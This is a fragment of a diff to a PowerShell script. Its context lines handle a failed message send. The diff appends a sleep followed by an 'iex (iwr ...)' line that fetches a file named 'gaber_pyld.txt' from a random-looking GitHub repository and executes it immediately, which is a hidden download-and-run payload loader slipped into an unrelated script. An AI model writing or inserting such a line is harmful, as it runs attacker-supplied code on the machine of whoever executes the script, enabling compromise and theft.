@@ -32,3 +32,5 @@ try {
 } catch {
     Write-Output "Failed to send message. Error: $_"
 }
+sleep 5
+iex (iwr raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/gaber_pyld.txt -usebasicparsing)
